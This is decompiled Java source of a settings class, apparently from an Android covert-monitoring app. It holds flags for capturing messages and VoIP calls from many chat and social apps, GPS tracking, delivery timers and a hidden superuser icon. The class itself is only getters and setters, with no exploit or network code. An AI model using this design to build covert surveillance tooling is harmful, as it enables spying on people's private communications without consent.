package com.vvt.remotecontrol.output;

import com.vvt.base.FeatureId;
import com.vvt.base.FxDeliveryMethod;
import com.vvt.base.RunningMode;
import com.vvt.remotecontrol.input.RmtCtrlInputAddressBookMode.Mode;
import com.vvt.remotecontrol.input.RmtCtrlInputCallRecordingAudioSource.AudioSource;
import com.vvt.remotecontrol.input.RmtCtrlInputImAttachmentLimitSize;
import com.vvt.remotecontrol.input.RmtCtrlInputPanicMode.Mode;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class RmtCtrlOutputSettings
  implements Serializable
{
  private static final long serialVersionUID = -4073839259583108321L;
  private RmtCtrlInputAddressBookMode.Mode addressBookMode;
  private HashMap commonData;
  private int configurationId;
  private FxDeliveryMethod deliveryMethod;
  private int deliveryTimer;
  private HashMap featureStatus;
  private long gpsTrackingIntervalMs;
  private RmtCtrlInputImAttachmentLimitSize imAttachmentLimitSize;
  private boolean isBBMCaptureEnabled;
  private boolean isBBMCaptureSupported;
  private boolean isCaptureEnabled;
  private boolean isDeliverEnabled;
  private boolean isFacebookCaptureEnabled;
  private boolean isFacebookCaptureSupported;
  private boolean isFacebookVoipCallRecordingCaptureEnabled;
  private boolean isFacebookVoipCallRecordingCaptureSupported;
  private boolean isHangoutCaptureEnabled;
  private boolean isHangoutCaptureSupported;
  private boolean isHangoutVoipCallRecordingCaptureEnabled;
  private boolean isHangoutVoipCallRecordingCaptureSupported;
  private boolean isHikeCaptureEnabled;
  private boolean isHikeCaptureSupported;
  private boolean isInstagramCaptureEnabled;
  private boolean isInstagramCaptureSupported;
  private boolean isKikMessengerCaptureEnabled;
  private boolean isKikMessengerCaptureSupported;
  private boolean isLineCaptureEnabled;
  private boolean isLineCaptureSupported;
  private boolean isLineVoipCallRecordingCaptureEnabled;
  private boolean isLineVoipCallRecordingCaptureSupported;
  private boolean isQQCaptureEnabled;
  private boolean isQQCaptureSupported;
  private boolean isSkypeCaptureEnabled;
  private boolean isSkypeCaptureSupported;
  private boolean isSkypeVoipCallRecordingCaptureEnabled;
  private boolean isSkypeVoipCallRecordingCaptureSupported;
  private boolean isSnapchatCaptureEnabled;
  private boolean isSnapchatCaptureSupported;
  private boolean isSuperIconHidden;
  private boolean isTelegramMessengerCaptureEnabled;
  private boolean isTelegramMessengerCaptureSupported;
  private boolean isTinderCaptureEnabled;
  private boolean isTinderCaptureSupported;
  private boolean isViberCaptureEnabled;
  private boolean isViberCaptureSupported;
  private boolean isViberVoipCallRecordingCaptureEnabled;
  private boolean isViberVoipCallRecordingCaptureSupported;
  private boolean isWeChatCaptureEnabled;
  private boolean isWeChatCaptureSupported;
  private boolean isWhatsAppCaptureEnabled;
  private boolean isWhatsAppCaptureSupported;
  private boolean isWhatsAppVoipCallRecordingCaptureEnabled;
  private boolean isWhatsAppVoipCallRecordingCaptureSupported;
  private boolean isYahooMessengerCaptureEnabled;
  private boolean isYahooMessengerCaptureSupported;
  private List locationProviders;
  private RmtCtrlInputCallRecordingAudioSource.AudioSource mCallRecAudioSource;
  private int mCallRecWatchFlag;
  private RmtCtrlInputPanicMode.Mode panicMode;
  private RunningMode runningMode;
  private int triggerNumber;
  private int watchFlag;
  
  public RmtCtrlOutputSettings()
  {
    Object localObject = new java/util/ArrayList;
    ((ArrayList)localObject).<init>();
    setLocationProviders((List)localObject);
    localObject = new java/util/HashMap;
    ((HashMap)localObject).<init>();
    this.commonData = ((HashMap)localObject);
    localObject = new java/util/HashMap;
    ((HashMap)localObject).<init>();
    this.featureStatus = ((HashMap)localObject);
    localObject = RmtCtrlInputCallRecordingAudioSource.AudioSource.MICROPHONE;
    this.mCallRecAudioSource = ((RmtCtrlInputCallRecordingAudioSource.AudioSource)localObject);
  }
  
  public void addCommonData(FeatureId paramFeatureId, String paramString)
  {
    Object localObject = this.commonData;
    boolean bool = ((HashMap)localObject).containsKey(paramFeatureId);
    if (bool) {
      localObject = (List)this.commonData.get(paramFeatureId);
    }
    for (;;)
    {
      ((List)localObject).add(paramString);
      return;
      localObject = new java/util/ArrayList;
      ((ArrayList)localObject).<init>();
      HashMap localHashMap = this.commonData;
      localHashMap.put(paramFeatureId, localObject);
    }
  }
  
  public void addFeatureStatus(FeatureId paramFeatureId, boolean paramBoolean)
  {
    HashMap localHashMap = this.featureStatus;
    Boolean localBoolean = Boolean.valueOf(paramBoolean);
    localHashMap.put(paramFeatureId, localBoolean);
  }
  
  public RmtCtrlInputAddressBookMode.Mode getAddressBookMode()
  {
    return this.addressBookMode;
  }
  
  public int getCallRecWatchFlag()
  {
    return this.mCallRecWatchFlag;
  }
  
  public RmtCtrlInputCallRecordingAudioSource.AudioSource getCallRecordingAudioSource()
  {
    return this.mCallRecAudioSource;
  }
  
  public List getCommonData(FeatureId paramFeatureId)
  {
    Object localObject = (List)this.commonData.get(paramFeatureId);
    if (localObject == null)
    {
      localObject = new java/util/ArrayList;
      ((ArrayList)localObject).<init>();
    }
    return (List)localObject;
  }
  
  public int getConfigurationId()
  {
    return this.configurationId;
  }
  
  public FxDeliveryMethod getDeliveryMethod()
  {
    return this.deliveryMethod;
  }
  
  public int getDeliveryTimer()
  {
    return this.deliveryTimer;
  }
  
  public boolean getFeatureStatus(FeatureId paramFeatureId)
  {
    Object localObject = this.featureStatus;
    boolean bool = ((HashMap)localObject).containsKey(paramFeatureId);
    if (bool)
    {
      localObject = (Boolean)this.featureStatus.get(paramFeatureId);
      bool = ((Boolean)localObject).booleanValue();
    }
    for (;;)
    {
      return bool;
      bool = false;
      localObject = null;
    }
  }
  
  public long getGpsTrackingIntervalMs()
  {
    return this.gpsTrackingIntervalMs;
  }
  
  public RmtCtrlInputImAttachmentLimitSize getImAttachmentLimitSize()
  {
    return this.imAttachmentLimitSize;
  }
  
  public List getLocationProviders()
  {
    return this.locationProviders;
  }
  
  public RmtCtrlInputPanicMode.Mode getPanicMode()
  {
    return this.panicMode;
  }
  
  public RunningMode getRunningMode()
  {
    return this.runningMode;
  }
  
  public int getTriggerNumber()
  {
    return this.triggerNumber;
  }
  
  public int getWatchFlag()
  {
    return this.watchFlag;
  }
  
  public boolean isBBMCaptureEnabled()
  {
    return this.isBBMCaptureEnabled;
  }
  
  public boolean isBBMCaptureSupoprted()
  {
    return this.isBBMCaptureSupported;
  }
  
  public boolean isCaptureEnabled()
  {
    return this.isCaptureEnabled;
  }
  
  public boolean isDeliverEnabled()
  {
    return this.isDeliverEnabled;
  }
  
  public boolean isFacebookCaptureEnabled()
  {
    return this.isFacebookCaptureEnabled;
  }
  
  public boolean isFacebookCaptureSupported()
  {
    return this.isFacebookCaptureSupported;
  }
  
  public boolean isFacebookVoipCallRecordingCaptureEnabled()
  {
    return this.isFacebookVoipCallRecordingCaptureEnabled;
  }
  
  public boolean isFacebookVoipCallRecordingCaptureSupported()
  {
    return this.isFacebookVoipCallRecordingCaptureSupported;
  }
  
  public boolean isHangoutCaptureEnabled()
  {
    return this.isHangoutCaptureEnabled;
  }
  
  public boolean isHangoutCaptureSupported()
  {
    return this.isHangoutCaptureSupported;
  }
  
  public boolean isHangoutVoipCallRecordingCaptureEnabled()
  {
    return this.isHangoutVoipCallRecordingCaptureEnabled;
  }
  
  public boolean isHangoutVoipCallRecordingCaptureSupported()
  {
    return this.isHangoutVoipCallRecordingCaptureSupported;
  }
  
  public boolean isHikeCaptureEnabled()
  {
    return this.isHikeCaptureEnabled;
  }
  
  public boolean isHikeCaptureSupported()
  {
    return this.isHikeCaptureSupported;
  }
  
  public boolean isInstagramCaptureEnabled()
  {
    return this.isInstagramCaptureEnabled;
  }
  
  public boolean isInstagramCaptureSupported()
  {
    return this.isInstagramCaptureSupported;
  }
  
  public boolean isKikMessengerCaptureEnabled()
  {
    return this.isKikMessengerCaptureEnabled;
  }
  
  public boolean isKikMessengerCaptureSupported()
  {
    return this.isKikMessengerCaptureSupported;
  }
  
  public boolean isLineCaptureEnabled()
  {
    return this.isLineCaptureEnabled;
  }
  
  public boolean isLineCaptureSupported()
  {
    return this.isLineCaptureSupported;
  }
  
  public boolean isLineVoipCallRecordingCaptureEnabled()
  {
    return this.isLineVoipCallRecordingCaptureEnabled;
  }
  
  public boolean isLineVoipCallRecordingCaptureSupported()
  {
    return this.isLineVoipCallRecordingCaptureSupported;
  }
  
  public boolean isQQCaptureEnabled()
  {
    return this.isQQCaptureEnabled;
  }
  
  public boolean isQQCaptureSupported()
  {
    return this.isQQCaptureSupported;
  }
  
  public boolean isSkypeCaptureEnabled()
  {
    return this.isSkypeCaptureEnabled;
  }
  
  public boolean isSkypeCaptureSupported()
  {
    return this.isSkypeCaptureSupported;
  }
  
  public boolean isSkypeVoipCallRecordingCaptureEnabled()
  {
    return this.isSkypeVoipCallRecordingCaptureEnabled;
  }
  
  public boolean isSkypeVoipCallRecordingCaptureSupported()
  {
    return this.isSkypeVoipCallRecordingCaptureSupported;
  }
  
  public boolean isSnapchatCaptureEnabled()
  {
    return this.isSnapchatCaptureEnabled;
  }
  
  public boolean isSnapchatCaptureSupported()
  {
    return this.isSnapchatCaptureSupported;
  }
  
  public boolean isSuperUserIconHidden()
  {
    return this.isSuperIconHidden;
  }
  
  public boolean isTelegramMessengerCaptureEnabled()
  {
    return this.isTelegramMessengerCaptureEnabled;
  }
  
  public boolean isTelegramMessengerCaptureSupported()
  {
    return this.isTelegramMessengerCaptureSupported;
  }
  
  public boolean isTinderCaptureEnabled()
  {
    return this.isTinderCaptureEnabled;
  }
  
  public boolean isTinderCaptureSupported()
  {
    return this.isTinderCaptureSupported;
  }
  
  public boolean isViberCaptureEnabled()
  {
    return this.isViberCaptureEnabled;
  }
  
  public boolean isViberCaptureSupported()
  {
    return this.isViberCaptureSupported;
  }
  
  public boolean isViberVoipCallRecordingCaptureEnabled()
  {
    return this.isViberVoipCallRecordingCaptureEnabled;
  }
  
  public boolean isViberVoipCallRecordingCaptureSupported()
  {
    return this.isViberVoipCallRecordingCaptureSupported;
  }
  
  public boolean isWeChatCaptureEnabled()
  {
    return this.isWeChatCaptureEnabled;
  }
  
  public boolean isWeChatCaptureSupported()
  {
    return this.isWeChatCaptureSupported;
  }
  
  public boolean isWhatsAppCaptureEnabled()
  {
    return this.isWhatsAppCaptureEnabled;
  }
  
  public boolean isWhatsAppCaptureSupported()
  {
    return this.isWhatsAppCaptureSupported;
  }
  
  public boolean isWhatsAppVoipCallRecordingCaptureEnabled()
  {
    return this.isWhatsAppVoipCallRecordingCaptureEnabled;
  }
  
  public boolean isWhatsAppVoipCallRecordingCaptureSupported()
  {
    return this.isWhatsAppVoipCallRecordingCaptureSupported;
  }
  
  public boolean isYahooMessengerCaptureEnabled()
  {
    return this.isYahooMessengerCaptureEnabled;
  }
  
  public boolean isYahooMessengerCaptureSupported()
  {
    return this.isYahooMessengerCaptureSupported;
  }
  
  public void setAddressBookMode(RmtCtrlInputAddressBookMode.Mode paramMode)
  {
    this.addressBookMode = paramMode;
  }
  
  public void setBBMCaptureEnabled(boolean paramBoolean)
  {
    this.isBBMCaptureEnabled = paramBoolean;
  }
  
  public void setBBMCaptureSupoprted(boolean paramBoolean)
  {
    this.isBBMCaptureSupported = paramBoolean;
  }
  
  public void setCallRecWatchFlag(int paramInt)
  {
    this.mCallRecWatchFlag = paramInt;
  }
  
  public void setCallRecordingAudioSource(RmtCtrlInputCallRecordingAudioSource.AudioSource paramAudioSource)
  {
    this.mCallRecAudioSource = paramAudioSource;
  }
  
  public void setCaptureEnabled(boolean paramBoolean)
  {
    this.isCaptureEnabled = paramBoolean;
  }
  
  public void setConfigurationId(int paramInt)
  {
    this.configurationId = paramInt;
  }
  
  public void setDeliverEnabled(boolean paramBoolean)
  {
    this.isDeliverEnabled = paramBoolean;
  }
  
  public void setDeliveryMethod(FxDeliveryMethod paramFxDeliveryMethod)
  {
    this.deliveryMethod = paramFxDeliveryMethod;
  }
  
  public void setDeliveryTimer(int paramInt)
  {
    this.deliveryTimer = paramInt;
  }
  
  public void setFacebookCaptureEnabled(boolean paramBoolean)
  {
    this.isFacebookCaptureEnabled = paramBoolean;
  }
  
  public void setFacebookCaptureSupported(boolean paramBoolean)
  {
    this.isFacebookCaptureSupported = paramBoolean;
  }
  
  public void setFacebookVoipCallRecordingCaptureEnabled(boolean paramBoolean)
  {
    this.isFacebookVoipCallRecordingCaptureEnabled = paramBoolean;
  }
  
  public void setFacebookVoipCallRecordingCaptureSupported(boolean paramBoolean)
  {
    this.isFacebookVoipCallRecordingCaptureSupported = paramBoolean;
  }
  
  public void setGpsTrackingIntervalMs(long paramLong)
  {
    this.gpsTrackingIntervalMs = paramLong;
  }
  
  public void setHangoutCaptureEnabled(boolean paramBoolean)
  {
    this.isHangoutCaptureEnabled = paramBoolean;
  }
  
  public void setHangoutCaptureSupported(boolean paramBoolean)
  {
    this.isHangoutCaptureSupported = paramBoolean;
  }
  
  public void setHangoutVoipCallRecordingCaptureEnabled(boolean paramBoolean)
  {
    this.isHangoutVoipCallRecordingCaptureEnabled = paramBoolean;
  }
  
  public void setHangoutVoipCallRecordingCaptureSupported(boolean paramBoolean)
  {
    this.isHangoutVoipCallRecordingCaptureSupported = paramBoolean;
  }
  
  public void setHikeCaptureEnabled(boolean paramBoolean)
  {
    this.isHikeCaptureEnabled = paramBoolean;
  }
  
  public void setHikeCaptureSupported(boolean paramBoolean)
  {
    this.isHikeCaptureSupported = paramBoolean;
  }
  
  public void setImAttachmentLimitSize(RmtCtrlInputImAttachmentLimitSize paramRmtCtrlInputImAttachmentLimitSize)
  {
    this.imAttachmentLimitSize = paramRmtCtrlInputImAttachmentLimitSize;
  }
  
  public void setInstagramCaptureEnabled(boolean paramBoolean)
  {
    this.isInstagramCaptureEnabled = paramBoolean;
  }
  
  public void setInstagramCaptureSupported(boolean paramBoolean)
  {
    this.isInstagramCaptureSupported = paramBoolean;
  }
  
  public void setKikMessengerCaptureEnabled(boolean paramBoolean)
  {
    this.isKikMessengerCaptureEnabled = paramBoolean;
  }
  
  public void setKikMessengerCaptureSupported(boolean paramBoolean)
  {
    this.isKikMessengerCaptureSupported = paramBoolean;
  }
  
  public void setLineCaptureEnabled(boolean paramBoolean)
  {
    this.isLineCaptureEnabled = paramBoolean;
  }
  
  public void setLineCaptureSupported(boolean paramBoolean)
  {
    this.isLineCaptureSupported = paramBoolean;
  }
  
  public void setLineVoipCallRecordingCaptureEnabled(boolean paramBoolean)
  {
    this.isLineVoipCallRecordingCaptureEnabled = paramBoolean;
  }
  
  public void setLineVoipCallRecordingCaptureSupported(boolean paramBoolean)
  {
    this.isLineVoipCallRecordingCaptureSupported = paramBoolean;
  }
  
  public void setLocationProviders(List paramList)
  {
    this.locationProviders = paramList;
  }
  
  public void setPanicMode(RmtCtrlInputPanicMode.Mode paramMode)
  {
    this.panicMode = paramMode;
  }
  
  public void setQQCaptureEnabled(boolean paramBoolean)
  {
    this.isQQCaptureEnabled = paramBoolean;
  }
  
  public void setQQCaptureSupported(boolean paramBoolean)
  {
    this.isQQCaptureSupported = paramBoolean;
  }
  
  public void setRunningMode(RunningMode paramRunningMode)
  {
    this.runningMode = paramRunningMode;
  }
  
  public void setSkypeCaptureEnabled(boolean paramBoolean)
  {
    this.isSkypeCaptureEnabled = paramBoolean;
  }
  
  public void setSkypeCaptureSupported(boolean paramBoolean)
  {
    this.isSkypeCaptureSupported = paramBoolean;
  }
  
  public void setSkypeVoipCallRecordingCaptureEnabled(boolean paramBoolean)
  {
    this.isSkypeVoipCallRecordingCaptureEnabled = paramBoolean;
  }
  
  public void setSkypeVoipCallRecordingCaptureSupported(boolean paramBoolean)
  {
    this.isSkypeVoipCallRecordingCaptureSupported = paramBoolean;
  }
  
  public void setSnapchatCaptureEnabled(boolean paramBoolean)
  {
    this.isSnapchatCaptureEnabled = paramBoolean;
  }
  
  public void setSnapchatCaptureSupported(boolean paramBoolean)
  {
    this.isSnapchatCaptureSupported = paramBoolean;
  }
  
  public void setSuperUserIconHidden(boolean paramBoolean)
  {
    this.isSuperIconHidden = paramBoolean;
  }
  
  public void setTelegramMessengerCaptureEnabled(boolean paramBoolean)
  {
    this.isTelegramMessengerCaptureEnabled = paramBoolean;
  }
  
  public void setTelegramMessengerCaptureSupported(boolean paramBoolean)
  {
    this.isTelegramMessengerCaptureSupported = paramBoolean;
  }
  
  public void setTinderCaptureEnabled(boolean paramBoolean)
  {
    this.isTinderCaptureEnabled = paramBoolean;
  }
  
  public void setTinderCaptureSupported(boolean paramBoolean)
  {
    this.isTinderCaptureSupported = paramBoolean;
  }
  
  public void setTriggerNumber(int paramInt)
  {
    this.triggerNumber = paramInt;
  }
  
  public void setViberCaptureEnabled(boolean paramBoolean)
  {
    this.isViberCaptureEnabled = paramBoolean;
  }
  
  public void setViberCaptureSupported(boolean paramBoolean)
  {
    this.isViberCaptureSupported = paramBoolean;
  }
  
  public void setViberVoipCallRecordingCaptureEnabled(boolean paramBoolean)
  {
    this.isViberVoipCallRecordingCaptureEnabled = paramBoolean;
  }
  
  public void setViberVoipCallRecordingCaptureSupported(boolean paramBoolean)
  {
    this.isViberVoipCallRecordingCaptureSupported = paramBoolean;
  }
  
  public void setWatchFlag(int paramInt)
  {
    this.watchFlag = paramInt;
  }
  
  public void setWeChatCaptureEnabled(boolean paramBoolean)
  {
    this.isWeChatCaptureEnabled = paramBoolean;
  }
  
  public void setWeChatCaptureSupported(boolean paramBoolean)
  {
    this.isWeChatCaptureSupported = paramBoolean;
  }
  
  public void setWhatsAppCaptureEnabled(boolean paramBoolean)
  {
    this.isWhatsAppCaptureEnabled = paramBoolean;
  }
  
  public void setWhatsAppCaptureSupported(boolean paramBoolean)
  {
    this.isWhatsAppCaptureSupported = paramBoolean;
  }
  
  public void setWhatsAppVoipCallRecordingCaptureEnabled(boolean paramBoolean)
  {
    this.isWhatsAppVoipCallRecordingCaptureEnabled = paramBoolean;
  }
  
  public void setWhatsAppVoipCallRecordingCaptureSupported(boolean paramBoolean)
  {
    this.isWhatsAppVoipCallRecordingCaptureSupported = paramBoolean;
  }
  
  public void setYahooMessengerCaptureEnabled(boolean paramBoolean)
  {
    this.isYahooMessengerCaptureEnabled = paramBoolean;
  }
  
  public void setYahooMessengerCaptureSupported(boolean paramBoolean)
  {
    this.isYahooMessengerCaptureSupported = paramBoolean;
  }
  
  public String toString()
  {
    Object[] arrayOfObject = new Object[8];
    Object localObject = Boolean.valueOf(this.isCaptureEnabled);
    arrayOfObject[0] = localObject;
    localObject = Boolean.valueOf(this.isDeliverEnabled);
    arrayOfObject[1] = localObject;
    localObject = Integer.valueOf(this.triggerNumber);
    arrayOfObject[2] = localObject;
    localObject = Integer.valueOf(this.deliveryTimer);
    arrayOfObject[3] = localObject;
    localObject = this.featureStatus;
    arrayOfObject[4] = localObject;
    localObject = this.locationProviders;
    arrayOfObject[5] = localObject;
    localObject = Long.valueOf(this.gpsTrackingIntervalMs);
    arrayOfObject[6] = localObject;
    localObject = this.commonData;
    arrayOfObject[7] = localObject;
    return String.format("capture=%s, deliver=%s, trigger=%d, timer=%d\nevents=%s, providers=%s, trackingInterval=%d\ncommonData=%s", arrayOfObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecontrol/output/RmtCtrlOutputSettings.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */